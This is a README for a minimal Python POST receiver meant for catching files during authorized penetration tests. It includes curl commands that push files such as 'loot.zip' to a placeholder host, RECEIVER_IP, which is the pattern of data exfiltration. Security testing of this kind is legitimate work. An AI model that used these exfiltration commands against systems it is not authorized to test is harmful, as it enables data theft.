# Lightweight POST Receiver

> **Work in progress:** This project is under active development. The current
> implementation is functional but intentionally minimal; review the documented
> limitations before using it during an engagement.

A minimal Python HTTP server that receives raw POST request bodies and writes
them to disk. It is intended as a quick file-catching endpoint during
authorized penetration tests and red-team exercises—the receiving counterpart
to Python's built-in `http.server`.

The implementation uses only the Python standard library.

## Requirements

- Python 3
- Network access from the sending host to TCP port `8000`

## Usage

Start the receiver from the project directory:

```console
$ python3 upload_server.py
```

By default it listens on all interfaces (`0.0.0.0`) at port `8000` and
creates an `uploads/` directory in the current working directory. All of
that is configurable:

```console
$ python3 upload_server.py --bind 0.0.0.0 --port 8443 --dir /tmp/loot \
    --max-size 536870912
```

| Option | Default | Description |
| --- | --- | --- |
| `--bind` | `0.0.0.0` | Address to listen on |
| `--port` | `8000` | TCP port to listen on |
| `--dir` | `uploads` | Destination directory (created if missing) |
| `--max-size` | `1073741824` (1 GiB) | Maximum accepted body size in bytes; `0` disables the limit |
| `--overwrite` | off | Overwrite existing files instead of adding a numeric suffix |

Send a file as the raw request body:

```console
$ curl --data-binary @loot.zip \
    "http://RECEIVER_IP:8000/?name=loot.zip"
```

Example response:

```text
Saved 42817 bytes to uploads/loot.zip
```

The `name` query parameter should be URL-encoded when it contains spaces or
other reserved characters:

```console
$ curl --data-binary @report.txt \
    "http://RECEIVER_IP:8000/?name=host%20report.txt"
```

If `name` is omitted or empty, the receiver generates a unique name such as
`upload-20260728T174817-fe19c9ff.bin`:

```console
$ curl --data-binary @payload.bin "http://RECEIVER_IP:8000/"
```

Uploading a name that already exists on disk does not overwrite it by
default — the receiver adds a numeric suffix (`loot.zip`, `loot.1.zip`,
`loot.2.zip`, ...). Pass `--overwrite` at startup if you want same-name
uploads to replace the existing file instead.

Press `Ctrl-C` in the receiver terminal to stop the server.

## Current behavior and limitations

- Only POST requests are handled.
- The request body is treated as opaque binary data; multipart form uploads
  are not parsed.
- Filenames are reduced to their basename before being placed in the upload
  directory, and path separators/reserved characters are stripped so
  POSIX- and Windows-style traversal attempts (`../`, `..\`) can't escape it.
- The request body is streamed to a temporary file and atomically renamed
  into place, so it is never fully buffered in memory and partial/failed
  uploads don't leave a truncated file at the final destination.
- `Content-Length` is required and validated; missing, non-numeric, negative,
  or over-`--max-size` requests are rejected before any data is read.
- The server handles one request at a time.
- There is no authentication, encryption, or access control.

Because the listener binds to every network interface, use host firewall rules
and an engagement-controlled network to restrict who can reach it. Captured
files under `uploads/` are ignored by Git because they may contain sensitive
engagement data.

## Request format

```text
POST /?name=OUTPUT_FILENAME HTTP/1.1
Host: RECEIVER_IP:8000
Content-Length: NUMBER_OF_BYTES

RAW_FILE_BYTES
```

The server responds with `201 Created` after writing the body successfully.
